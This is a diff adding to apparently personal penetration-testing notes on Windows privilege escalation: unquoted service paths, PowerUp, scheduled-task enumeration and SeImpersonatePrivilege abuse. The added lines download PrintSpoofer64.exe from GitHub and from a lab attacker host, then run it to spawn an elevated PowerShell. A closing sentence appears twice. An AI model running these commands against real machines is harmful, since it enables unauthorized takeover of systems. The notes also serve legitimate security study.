@@ -1567,7 +1567,7 @@ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
 
 We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.
 
-use wmic to find unquoted service paths
+use wmic to find unquoted service paths (only works in cmd)
 ```
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
 ```
@@ -1586,3 +1586,42 @@ Restart-Service GammaService
 net user
 net localgroup administrators
 ```
+
+powerup fails you can use this
+```
+Import-Module .\PowerUp.ps1
+```
+
+### Scheduled Tasks
+
+```
+
+    As which user account (principal) does this task get executed?
+    What triggers are specified for the task?
+    What actions are executed when one or more of these triggers are met?
+```
+
+get list of scheduled tasks
+```
+schtasks /query /fo LIST /v
+```
+
+### Using Exploits
+
+can abuse SEImpersonatePrivilege through named pipes
+```
+whoami /priv
+```
+
+can use PrintSpoofer to elevate privileges
+```
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
+
+powershell
+iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+.\PrintSpoofer64.exe -i -c powershell.exe
+```
+
+ Variants from the Potato9 family (for example RottenPotato, SweetPotato, or JuicyPotato) are such tools. We should take the time to study these tools as they are an effective alternative to PrintSpoofer. Variants from the Potato9 family (for example RottenPotato, SweetPotato, or JuicyPotato) are such tools. We should take the time to study these tools as they are an effective alternative to PrintSpoofer.
+
